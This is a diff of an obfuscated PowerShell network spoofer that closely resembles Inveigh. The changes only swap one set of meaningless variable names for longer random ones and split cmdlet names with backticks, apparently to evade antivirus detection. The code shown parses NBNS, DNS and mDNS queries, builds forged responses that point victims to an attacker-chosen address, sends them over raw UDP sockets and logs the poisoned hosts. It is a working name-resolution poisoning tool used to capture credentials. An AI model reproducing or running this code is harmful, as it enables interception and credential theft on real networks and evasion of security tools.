+                                                ([System.Net.IPAddress][String]([System.Net.IPAddress]$zkTvnUBoWamaHbrMDvklWqGBdwC)).GetAddressBytes()
         
-                        $BlotKiss = 0x00,0x35 +
-                                                    $StewSmelly[1,0] +
-                                                    $SongsDouble +
+                        $xOCCvuYsyWmwcGUvJnJXIudwBdgWlffr = 0x00,0x35 +
+                                                    $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg[1,0] +
+                                                    $WGGuhBmadSfnyovoozzAiFU +
                                                     0x00,0x00 +
-                                                    $ScaleAgree[0,1] +
+                                                    $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[0,1] +
                                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
-                                                    $GrowthShiny
+                                                    $IVmhQmxJBBMLrKHCGWvstTssO
 
 
-                        $StageLovely = Get-SpooferResponseMessage -ExpectRitzy $WiseSquash -EarBucket "DNS" -GustyDance $HomelyShow
-                        $JazzyArrive = $StageLovely[0]
-                        $StageLovely = $StageLovely[1]
+                        $OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne = Get-SpooferResponseMessage -NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK $vFHZSPSNtCycYdounQRMVZOVRRTcn -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa "DNS" -uemMcbPkfaIvvmaKKrSfGp $tPEylzZKZOmcrNuZqaNvxfEfrUAkL
+                        $uFsmsawLbDwlxnGQtMAdCzEw = $OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne[0]
+                        $OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne = $OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne[1]
 
-                        if($StageLovely -eq '[response sent]')
+                        if($OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne -eq '[response sent]')
                         {
-                            $ClaimPart = ne`w-`obje`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
-                            $ClaimPart.SendBufferSize = 1024
-                            $RaggedCloth = ne`w-`obje`ct System.Net.IPEndpoint($StuffSky,$LittleLowly) 
-                            $ClaimPart.SendTo($BlotKiss,$RaggedCloth) > $null
-                            $ClaimPart.Close()
+                            $WPRzcEkolelEyAkZnmcGjSeWhJHCAHeKDUn = ne`w`-`ob`je`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
+                            $WPRzcEkolelEyAkZnmcGjSeWhJHCAHeKDUn.SendBufferSize = 1024
+                            $ORmistjPhkfOTnKOcPpYsoVJeogHi = ne`w`-`ob`je`ct System.Net.IPEndpoint($thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd,$faGTzGnMHxDNWDmxikWiLidyZdMakjiscEflfRBg) 
+                            $WPRzcEkolelEyAkZnmcGjSeWhJHCAHeKDUn.SendTo($xOCCvuYsyWmwcGUvJnJXIudwBdgWlffr,$ORmistjPhkfOTnKOcPpYsoVJeogHi) > $null
+                            $WPRzcEkolelEyAkZnmcGjSeWhJHCAHeKDUn.Close()
                         }
 
-                        if($BattleSalt -eq $SmashDolls)
+                        if($oykrKuVVEIoRCUDFEJUJvVjwnahnO -eq $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
                         {
-                            $LightOval.output_queue.Add("$JazzyArrive [$(Get-Date -format s)] DNS request for $WiseSquash received from $StuffSky $StageLovely") > $null
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("$uFsmsawLbDwlxnGQtMAdCzEw [$(Get-Date -format s)] DNS request for $vFHZSPSNtCycYdounQRMVZOVRRTcn received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne") > $null
                         }
                         else
                         {
-                            $LightOval.output_queue.Add("$JazzyArrive [$(Get-Date -format s)] DNS request for $WiseSquash sent to $BattleSalt [outgoing query]") > $null
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("$uFsmsawLbDwlxnGQtMAdCzEw [$(Get-Date -format s)] DNS request for $vFHZSPSNtCycYdounQRMVZOVRRTcn sent to $oykrKuVVEIoRCUDFEJUJvVjwnahnO [outgoing query]") > $null
                         }
 
                     }
@@ -4167,174 +4167,174 @@ $InnatePrefer =
                     137 # Microsoft".
                     {
                      
-                        if(([System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-01-00-00' -or [System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-00-00-01') -and [System.BitConverter]::ToString($ScaleAgree[10..11]) -ne '00-01')
+                        if(([System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[4..7]) -eq '00-01-00-00' -or [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[4..7]) -eq '00-00-00-01') -and [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[10..11]) -ne '00-01')
                         {
 
-                            if([System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-01-00-00')
+                            if([System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[4..7]) -eq '00-01-00-00')
                             {
-                                $SongsDouble[0] += 12
-                                $GaudyArgue = "[+]"
+                                $WGGuhBmadSfnyovoozzAiFU[0] += 12
+                                $qyAKyUBoHQSWEjgZQNhhBSPwENPcNqgfgajXBFkZuRr = "[+]"
                             
-                                $BasketDesert = $ScaleAgree[13..$ScaleAgree.Length] +
-                                                        $BaitWound +
+                                $ojnJLlLVOQjMCBYMYSlTxYen = $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[13..$NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length] +
+                                                        $PqfBMFnJtCcQXwIFXnfncaQHK +
                                                         0x00,0x06,0x00,0x00 +
-                                                        ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
+                                                        ([System.Net.IPAddress][String]([System.Net.IPAddress]$zkTvnUBoWamaHbrMDvklWqGBdwC)).GetAddressBytes()
                     
-                                $KindChess = 0x00,0x89 +
-                                                        $StewSmelly[1,0] +
-                                                        $SongsDouble[1,0] +
+                                $wzGnHWrGkMIPdpEeDpKeVyvJpWOmClka = 0x00,0x89 +
+                                                        $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg[1,0] +
+                                                        $WGGuhBmadSfnyovoozzAiFU[1,0] +
                                                         0x00,0x00 +
-                                                        $ScaleAgree[0,1] +
+                                                        $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[0,1] +
                                                         0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
-                                                        $BasketDesert
+                                                        $ojnJLlLVOQjMCBYMYSlTxYen
                     
-                                $HealthIcy = [System.BitConverter]::ToString($ScaleAgree[43..44])
-                                $HealthIcy = Get-NeedleSoak $HealthIcy
-                                $ScarceSlow = $ScaleAgree[47]
-                                $RhymeTaste = [System.BitConverter]::ToString($ScaleAgree[13..($ScaleAgree.Length - 4)])
-                                $RhymeTaste = $RhymeTaste -replace "-00",""
-                                $RhymeTaste = $RhymeTaste.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                                $UltraFail = ne`w-`obje`ct System.String ($RhymeTaste,0,$RhymeTaste.Length)
-                                $SkinInnate = $UltraFail
-                                $UltraFail = $UltraFail.Substring(0,$UltraFail.IndexOf("CA"))                
-                                $WiseWool = $null
-                                $DuckElbow = $null
-                                $PluckyIce = 0
+                                $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[43..44])
+                                $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = Get-ZsFNylZKZDXPRaRNjAMJ $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF
+                                $qfDybhrCkogeqBSwRgeuSRiXLZmeRXhUqAISlpNki = $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[47]
+                                $yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO = [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[13..($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length - 4)])
+                                $yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO = $yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO -replace "-00",""
+                                $yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO = $yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                                $iDwGmwnIkCppXduPLWlGifXN = ne`w`-`ob`je`ct System.String ($yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO,0,$yJLaLxBvGBoOUKHZzJyiDPwiTHIyknYjLszhYXlecNJbO.Length)
+                                $AIkaRhGeeUBTdokOmzrRKhnfsreokC = $iDwGmwnIkCppXduPLWlGifXN
+                                $iDwGmwnIkCppXduPLWlGifXN = $iDwGmwnIkCppXduPLWlGifXN.Substring(0,$iDwGmwnIkCppXduPLWlGifXN.IndexOf("CA"))                
+                                $aMbJhqozvbdtHJSzZEjeECXkYCozBAuHBoM = $null
+                                $JTeZBpXbOmozzaXsfaVV = $null
+                                $hQbHauzqGbiFGbiOXwzJJKmp = 0
                                 
                                 do
                                 {
-                                    $UntidyCake = (([Byte][Char]($UltraFail.Substring($PluckyIce,1))) - 65)
-                                    $WiseWool += ([System.Convert]::ToString($UntidyCake,16))
-                                    $PluckyIce++
+                                    $gTRmtuFxBIuvCgSWNqtgoUIsPvprrWcAkue = (([Byte][Char]($iDwGmwnIkCppXduPLWlGifXN.Substring($hQbHauzqGbiFGbiOXwzJJKmp,1))) - 65)
+                                    $aMbJhqozvbdtHJSzZEjeECXkYCozBAuHBoM += ([System.Convert]::ToString($gTRmtuFxBIuvCgSWNqtgoUIsPvprrWcAkue,16))
+                                    $hQbHauzqGbiFGbiOXwzJJKmp++
                                 }
-                                until($PluckyIce -ge ($UltraFail.Length))
+                                until($hQbHauzqGbiFGbiOXwzJJKmp -ge ($iDwGmwnIkCppXduPLWlGifXN.Length))
                         
-                                $PluckyIce = 0
+                                $hQbHauzqGbiFGbiOXwzJJKmp = 0
                         
                                 do
                                 {
-                                    $DuckElbow += ([Char]([System.Convert]::ToInt16($WiseWool.Substring($PluckyIce,2),16)))
-                                    $PluckyIce += 2
+                                    $JTeZBpXbOmozzaXsfaVV += ([Char]([System.Convert]::ToInt16($aMbJhqozvbdtHJSzZEjeECXkYCozBAuHBoM.Substring($hQbHauzqGbiFGbiOXwzJJKmp,2),16)))
+                                    $hQbHauzqGbiFGbiOXwzJJKmp += 2
                                 }
-                                until($PluckyIce -ge ($WiseWool.Length) -or $DuckElbow.Length -eq 15)
+                                until($hQbHauzqGbiFGbiOXwzJJKmp -ge ($aMbJhqozvbdtHJSzZEjeECXkYCozBAuHBoM.Length) -or $JTeZBpXbOmozzaXsfaVV.Length -eq 15)
 
-                                if($SkinInnate.StartsWith("ABAC") -and $SkinInnate.EndsWith("ACAB"))
+                                if($AIkaRhGeeUBTdokOmzrRKhnfsreokC.StartsWith("ABAC") -and $AIkaRhGeeUBTdokOmzrRKhnfsreokC.EndsWith("ACAB"))
                                 {
-                                    $DuckElbow = $DuckElbow.Substring(2)
-                                    $DuckElbow = $DuckElbow.Substring(0, $DuckElbow.Length - 1)
-                                    $DuckElbow = "<01><02>" + $DuckElbow + "<02>"
+                                    $JTeZBpXbOmozzaXsfaVV = $JTeZBpXbOmozzaXsfaVV.Substring(2)
+                                    $JTeZBpXbOmozzaXsfaVV = $JTeZBpXbOmozzaXsfaVV.Substring(0, $JTeZBpXbOmozzaXsfaVV.Length - 1)
+                                    $JTeZBpXbOmozzaXsfaVV = "<01><02>" + $JTeZBpXbOmozzaXsfaVV + "<02>"
                                 }
 
-                                if($DuckElbow -notmatch '[^\x00-\x7F]+')
+                                if($JTeZBpXbOmozzaXsfaVV -notmatch '[^\x00-\x7F]+')
                                 {
 
-                                    if(!$LightOval.request_table.ContainsKey($DuckElbow))
+                                    if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.ContainsKey($JTeZBpXbOmozzaXsfaVV))
                                     {
-                                        $LightOval.request_table.Add($DuckElbow.ToLower(),[Array]$StuffSky.IPAddressToString)
-                                        $LightOval.request_table_updated = $true
+                                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.Add($JTeZBpXbOmozzaXsfaVV.ToLower(),[Array]$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString)
+                                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table_updated = $true
                                     }
                                     else
                                     {
-                                        $LightOval.request_table.$DuckElbow += $StuffSky.IPAddressToString
-                                        $LightOval.request_table_updated = $true
+                                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.$JTeZBpXbOmozzaXsfaVV += $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString
+                                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table_updated = $true
                                     }
 
                                 }
 
-                                $EnjoyBright = $false
+                                $bVtDZcEkOXAmYhMXbHdsZwDdmSUCmQGJtDM = $false
                             }
 
-                            if($PlugTour -eq 'Y' -and $LightOval.valid_host_list -notcontains $DuckElbow -and [System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-01-00-00' -and $StuffSky -ne $SmashDolls)
+                            if($LPmXJzyXqTgdUoElyxFCYzOJzqmSu -eq 'Y' -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.valid_host_list -notcontains $JTeZBpXbOmozzaXsfaVV -and [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[4..7]) -eq '00-01-00-00' -and $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd -ne $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
                             {
                             
-                                if(($AbruptWorm.Exists({param($PlantsIrate) $PlantsIrate -like "20* $DuckElbow"})))
+                                if(($qQsKMpTBczQiMsGpIWDoHuTrLVVDvOij.Exists({param($ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk) $ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk -like "20* $JTeZBpXbOmozzaXsfaVV"})))
                                 {
-                                    $NoticeRagged = [DateTime]$AbruptWorm.Find({param($PlantsIrate) $PlantsIrate -like "20* $DuckElbow"}).SubString(0,19)
+                                    $AYhaGoOlefhrWfAXUOBEHiAbdgfbmbnjoedewIgwMhWr = [DateTime]$qQsKMpTBczQiMsGpIWDoHuTrLVVDvOij.Find({param($ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk) $ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk -like "20* $JTeZBpXbOmozzaXsfaVV"}).SubString(0,19)
 
-                                    if((Get-Date) -ge $NoticeRagged.AddMinutes($WrongAnts))
+                                    if((Get-Date) -ge $AYhaGoOlefhrWfAXUOBEHiAbdgfbmbnjoedewIgwMhWr.AddMinutes($eEmdEINEKedVTvUFZHbuolOJMVn))
                                     {
-                                        $AbruptWorm.RemoveAt($AbruptWorm.FindIndex({param($PlantsIrate) $PlantsIrate -like "20* $DuckElbow"}))
-                                        $NeatSaw = $true
+                                        $qQsKMpTBczQiMsGpIWDoHuTrLVVDvOij.RemoveAt($qQsKMpTBczQiMsGpIWDoHuTrLVVDvOij.FindIndex({param($ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk) $ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk -like "20* $JTeZBpXbOmozzaXsfaVV"}))
+                                        $RnJFDTRStrgfPVELzjieoOWBKFLevoOSDMclJBkKMsbX = $true
                                     }
                                     else
                                     {
-                                        $NeatSaw = $false
+                                        $RnJFDTRStrgfPVELzjieoOWBKFLevoOSDMclJBkKMsbX = $false
                                     }
 
                                 }
                                 else
                                 {           
-                                    $NeatSaw = $true
+                                    $RnJFDTRStrgfPVELzjieoOWBKFLevoOSDMclJBkKMsbX = $true
                                 }
 
-                                if($NeatSaw)
+                                if($RnJFDTRStrgfPVELzjieoOWBKFLevoOSDMclJBkKMsbX)
                                 {
-                                    $VesselBleach = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-ToothWave -WoodWrist 1 -WallWish 255)})
-                                    $ShakyThrone = $VesselBleach.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                                    $VesselBleach = $VesselBleach -replace " ","-"
-                                    $HollowSquash = ne`w-`obje`ct System.Net.Sockets.UdpClient 137
-                                    $ReignType = $ScaleAgree[13..($ScaleAgree.Length - 5)]
+                                    $dtMLzohWLBOFOcjmvqPSKJNfZoLslXclO = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-rQvIhbCYcgJnjexbvfzYl -RyfnekGrAXltRYKOcZlmehLbXfMrcRXMOsdYDZFzv 1 -MWmmsgTGcAfLneCdvoUydakhVQxIVvPpmvWLoT 255)})
+                                    $OtKYKuSgIkybLsPuSaeoe = $dtMLzohWLBOFOcjmvqPSKJNfZoLslXclO.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                                    $dtMLzohWLBOFOcjmvqPSKJNfZoLslXclO = $dtMLzohWLBOFOcjmvqPSKJNfZoLslXclO -replace " ","-"
+                                    $jWdfmbdepWlSyuBmlkkKlMuAhQsF = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient 137
+                                    $cCUdJJmOAVSfCqilhpsbMGQGpcJAxTeanLpUkBmBEW = $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[13..($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length - 5)]
 
-                                    $NailTrace = $ShakyThrone +
+                                    $SSAclwRIYplBXYwERUflmEqBkvgbsUWwp = $OtKYKuSgIkybLsPuSaeoe +
                                                             0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +
-                                                            $ReignType +
+                                                            $cCUdJJmOAVSfCqilhpsbMGQGpcJAxTeanLpUkBmBEW +
                                                             0x00,0x20,0x00,0x01
 
-                                    $WrongCheese = ne`w-`obje`ct System.Net.IPEndpoint([IPAddress]::broadcast,137)
-                                    $HollowSquash.Connect($WrongCheese)
-                                    $HollowSquash.Send($NailTrace,$NailTrace.Length)
-                                    $HollowSquash.Close()
-                                    $AbruptWorm.Add("$(Get-Date -format s) $VesselBleach $DuckElbow") > $null
-                                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] NBNS request $DuckElbow sent to " + $WrongCheese.Address.IPAddressToString) > $null
+                                    $GTQczycaqOhvAubPjjCjOhJKTNGltKHc = ne`w`-`ob`je`ct System.Net.IPEndpoint([IPAddress]::broadcast,137)
+                                    $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Connect($GTQczycaqOhvAubPjjCjOhJKTNGltKHc)
+                                    $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Send($SSAclwRIYplBXYwERUflmEqBkvgbsUWwp,$SSAclwRIYplBXYwERUflmEqBkvgbsUWwp.Length)
+                                    $jWdfmbdepWlSyuBmlkkKlMuAhQsF.Close()
+                                    $qQsKMpTBczQiMsGpIWDoHuTrLVVDvOij.Add("$(Get-Date -format s) $dtMLzohWLBOFOcjmvqPSKJNfZoLslXclO $JTeZBpXbOmozzaXsfaVV") > $null
+                                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] NBNS request $JTeZBpXbOmozzaXsfaVV sent to " + $GTQczycaqOhvAubPjjCjOhJKTNGltKHc.Address.IPAddressToString) > $null
                                 }
 
                             }
 
-                            $TidyIron = Get-SpooferResponseMessage -ExpectRitzy $DuckElbow -EarBucket "NBNS" -GustyDance $PeckFirst -PiesDesk $ScarceSlow
-                            $GaudyArgue = $TidyIron[0]
-                            $TidyIron = $TidyIron[1]
+                            $KeVSBneOSgjHTUHPjXtwZCs = Get-SpooferResponseMessage -NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK $JTeZBpXbOmozzaXsfaVV -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa "NBNS" -uemMcbPkfaIvvmaKKrSfGp $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -GrSMnlUYOpxqPmnvgxksnOntoUntTCzEea $qfDybhrCkogeqBSwRgeuSRiXLZmeRXhUqAISlpNki
+                            $qyAKyUBoHQSWEjgZQNhhBSPwENPcNqgfgajXBFkZuRr = $KeVSBneOSgjHTUHPjXtwZCs[0]
+                            $KeVSBneOSgjHTUHPjXtwZCs = $KeVSBneOSgjHTUHPjXtwZCs[1]
 
-                            if($TidyIron -eq '[response sent]')
+                            if($KeVSBneOSgjHTUHPjXtwZCs -eq '[response sent]')
                             {
 
-                                if($PlugTour -eq 'N' -or !$AbruptWorm.Exists({param($PlantsIrate) $PlantsIrate -like "* " + [System.BitConverter]::ToString($ScaleAgree[0..1]) + " *"}))
+                                if($LPmXJzyXqTgdUoElyxFCYzOJzqmSu -eq 'N' -or !$qQsKMpTBczQiMsGpIWDoHuTrLVVDvOij.Exists({param($ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk) $ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk -like "* " + [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[0..1]) + " *"}))
                                 {
-                                    $MarketPies = ne`w-`obje`ct Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
-                                    $MarketPies.SendBufferSize = 1024
-                                    $JarBeef = ne`w-`obje`ct Net.IPEndpoint($StuffSky,$LittleLowly)
-                                    $MarketPies.SendTo($KindChess,$JarBeef) > $null
-                                    $MarketPies.Close()
+                                    $FpzwMbkdQRVnHMuFTfOMDGlz = ne`w`-`ob`je`ct Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
+                                    $FpzwMbkdQRVnHMuFTfOMDGlz.SendBufferSize = 1024
+                                    $cVFOTArlJLspZdIWrYNHWtG = ne`w`-`ob`je`ct Net.IPEndpoint($thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd,$faGTzGnMHxDNWDmxikWiLidyZdMakjiscEflfRBg)
+                                    $FpzwMbkdQRVnHMuFTfOMDGlz.SendTo($wzGnHWrGkMIPdpEeDpKeVyvJpWOmClka,$cVFOTArlJLspZdIWrYNHWtG) > $null
+                                    $FpzwMbkdQRVnHMuFTfOMDGlz.Close()
                                 }
                                 else
                                 {
-                                    $EnjoyBright = $true
+                                    $bVtDZcEkOXAmYhMXbHdsZwDdmSUCmQGJtDM = $true
                                 }
                                 
                             }
                             else
                             {
                                 
-                                if($StuffSky -eq $SmashDolls -and $AbruptWorm.Exists({param($PlantsIrate) $PlantsIrate -like "* " + [System.BitConverter]::ToString($ScaleAgree[0..1]) + " *"}))
+                                if($thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd -eq $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS -and $qQsKMpTBczQiMsGpIWDoHuTrLVVDvOij.Exists({param($ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk) $ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk -like "* " + [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[0..1]) + " *"}))
                                 {
-                                    $EnjoyBright = $true
+                                    $bVtDZcEkOXAmYhMXbHdsZwDdmSUCmQGJtDM = $true
                                 }
                                 
                             }
 
-                            if(!$EnjoyBright -and [System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-01-00-00')
+                            if(!$bVtDZcEkOXAmYhMXbHdsZwDdmSUCmQGJtDM -and [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[4..7]) -eq '00-01-00-00')
                             {
-                                $LightOval.output_queue.Add("$GaudyArgue [$(Get-Date -format s)] NBNS request for $DuckElbow<$HealthIcy> received from $StuffSky $TidyIron") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("$qyAKyUBoHQSWEjgZQNhhBSPwENPcNqgfgajXBFkZuRr [$(Get-Date -format s)] NBNS request for $JTeZBpXbOmozzaXsfaVV<$VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF> received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $KeVSBneOSgjHTUHPjXtwZCs") > $null
                             }
-                            elseif($PlugTour -eq 'Y' -and [System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-00-00-01' -and $AbruptWorm.Exists({param($PlantsIrate) $PlantsIrate -like "* " + [System.BitConverter]::ToString($ScaleAgree[0..1]) + " *"}))
+                            elseif($LPmXJzyXqTgdUoElyxFCYzOJzqmSu -eq 'Y' -and [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[4..7]) -eq '00-00-00-01' -and $qQsKMpTBczQiMsGpIWDoHuTrLVVDvOij.Exists({param($ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk) $ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk -like "* " + [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[0..1]) + " *"}))
                             {
-                                [Byte[]]$NameRange = $ScaleAgree[($ScaleAgree.Length - 4)..($ScaleAgree.Length)]
-                                $SticksTongue = [System.Net.IPAddress]$NameRange
-                                $SticksTongue = $SticksTongue.IPAddressToString
+                                [Byte[]]$wIuqhtdcRgGXzavJzvZkNqEIcyXSEJRuzRz = $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length - 4)..($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length)]
+                                $waeIVfrVOqAzhlVVMvPQeUKNrOLDef = [System.Net.IPAddress]$wIuqhtdcRgGXzavJzvZkNqEIcyXSEJRuzRz
+                                $waeIVfrVOqAzhlVVMvPQeUKNrOLDef = $waeIVfrVOqAzhlVVMvPQeUKNrOLDef.IPAddressToString
 
-                                if($LightOval.valid_host_list -notcontains $DuckElbow)
+                                if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.valid_host_list -notcontains $JTeZBpXbOmozzaXsfaVV)
                                 {
-                                    $LightOval.valid_host_list.Add($DuckElbow) > $null
-                                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] NBNS response $SticksTongue for $DuckElbow received from $StuffSky [added to valid host list]") > $null
+                                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.valid_host_list.Add($JTeZBpXbOmozzaXsfaVV) > $null
+                                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] NBNS response $waeIVfrVOqAzhlVVMvPQeUKNrOLDef for $JTeZBpXbOmozzaXsfaVV received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd [added to valid host list]") > $null
                                 }
 
                             }
@@ -4346,83 +4346,83 @@ $InnatePrefer =
                     5353 # Microsoft".
                     {   
                         
-                        if(([System.BitConverter]::ToString($ScaleAgree)).EndsWith("-00-01-80-01") -and [System.BitConverter]::ToString($ScaleAgree[4..11]) -eq "00-01-00-00-00-00-00-00")
+                        if(([System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy)).EndsWith("-00-01-80-01") -and [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[4..11]) -eq "00-01-00-00-00-00-00-00")
                         {
-                            $SongsDouble[0] += 10
-                            $FuelMate = Get-NameQueryString 12 $ScaleAgree
-                            $DailyDrag = $ScaleAgree[12..($FuelMate.Length + 13)]
-                            $ClubSave = ($FuelMate.Split("."))[0]
